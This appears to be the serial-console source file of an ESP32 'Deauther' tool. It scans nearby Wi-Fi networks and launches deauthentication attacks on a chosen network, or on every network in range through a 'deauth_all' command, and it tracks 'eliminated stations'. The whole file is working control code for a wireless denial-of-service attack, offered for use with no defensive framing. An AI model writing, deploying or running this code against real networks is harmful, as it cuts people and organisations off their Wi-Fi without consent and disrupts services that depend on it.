#include <WiFi.h>
#include "serial_interface.h"
#include "deauth.h"
#include "definitions.h"

int num_networks = 0;
bool scan_complete = false;

void print_help() {
    Serial.println("\n=== ESP32-Deauther Serial Control ===");
    Serial.println("Commands:");
    Serial.println("  scan              - Scan WiFi networks");
    Serial.println("  list              - List scanned networks");
    Serial.println("  deauth <num> <reason> - Attack specific network");
    Serial.println("  deauth_all <reason>   - Attack all networks");
    Serial.println("  stop              - Stop attack");
    Serial.println("  status            - Show current status");
    Serial.println("  help              - Show this help");
    Serial.println("========================================\n");
}

void start_serial_interface() {
    Serial.begin(115200);
    delay(1000);
    Serial.println("\n[OK] ESP32-Deauther initialized");
    print_help();
}

void serial_interface_handle() {
    if (Serial.available() > 0) {
        String command = Serial.readStringUntil('\n');
        command.trim();
        
        if (command.startsWith("scan")) {
            Serial.print("[*] Scanning networks... ");
            num_networks = WiFi.scanNetworks();
            Serial.printf("%d networks found\n", num_networks);
            scan_complete = true;
        }
        else if (command.startsWith("list")) {
            if (!scan_complete || num_networks == 0) {
                Serial.println("[!] No networks scanned. Use 'scan' first.");
                return;
            }
            Serial.println("\n=== WiFi Networks ===");
            Serial.println("Num | SSID | BSSID | Channel | RSSI | Encryption");
            Serial.println("----|------|-------|---------|------|-----------");
            for (int i = 0; i < num_networks; i++) {
                Serial.printf("%-3d | %-20s | %s | %-7d | %-4d | %s\n",
                    i,                    WiFi.SSID(i).c_str(),
                    WiFi.BSSIDstr(i).c_str(),
                    WiFi.channel(i),
                    WiFi.RSSI(i),
                    getEncryptionType(WiFi.encryptionType(i)).c_str());
            }
            Serial.println("======================\n");
        }
        else if (command.startsWith("deauth ")) {
            int space1 = command.indexOf(' ');
            int space2 = command.indexOf(' ', space1 + 1);
            if (space2 == -1) {
                Serial.println("[!] Usage: deauth <network_num> <reason_code>");
                return;
            }
            int wifi_number = command.substring(space1 + 1, space2).toInt();
            uint16_t reason = command.substring(space2 + 1).toInt();
            
            if (wifi_number >= num_networks || wifi_number < 0) {
                Serial.println("[!] Invalid network number. Use 'list' to see available networks.");
                return;
            }
            
            Serial.printf("[*] Starting Deauth-Attack on: %s (Channel: %d)\n", 
                WiFi.SSID(wifi_number).c_str(), WiFi.channel(wifi_number));
            start_deauth(wifi_number, DEAUTH_TYPE_SINGLE, reason);
        }
        else if (command.startsWith("deauth_all")) {
            int space = command.indexOf(' ');
            uint16_t reason = (space != -1) ? command.substring(space + 1).toInt() : 1;
            
            Serial.println("[*] Starting Deauth-Attack on ALL networks!");
            Serial.println("[!] WiFi will shut down. Reset ESP32 to stop.");
            start_deauth(0, DEAUTH_TYPE_ALL, reason);
        }
        else if (command.startsWith("stop")) {
            Serial.println("[*] Stopping Deauth-Attack...");
            stop_deauth();
        }
        else if (command.startsWith("status")) {
            Serial.println("\n=== Status ===");
            Serial.printf("Attack Active: %s\n", (deauth_type != DEAUTH_TYPE_NONE) ? "YES" : "NO");
            Serial.printf("Eliminated Stations: %d\n", eliminated_stations);
            Serial.printf("Networks Scanned: %d\n", num_networks);
            Serial.println("==============\n");
        }
        else if (command.startsWith("help")) {
            print_help();
        }
        else if (command.length() > 0) {            Serial.printf("[!] Unknown command: %s\n", command.c_str());
            Serial.println("Type 'help' for available commands.\n");
        }
    }
}

String getEncryptionType(wifi_auth_mode_t encryptionType) {
    switch (encryptionType) {
        case WIFI_AUTH_OPEN: return "Open";
        case WIFI_AUTH_WEP: return "WEP";
        case WIFI_AUTH_WPA_PSK: return "WPA_PSK";
        case WIFI_AUTH_WPA2_PSK: return "WPA2_PSK";
        case WIFI_AUTH_WPA_WPA2_PSK: return "WPA_WPA2_PSK";
        case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2_ENTERPRISE";
        default: return "UNKNOWN";
    }
}
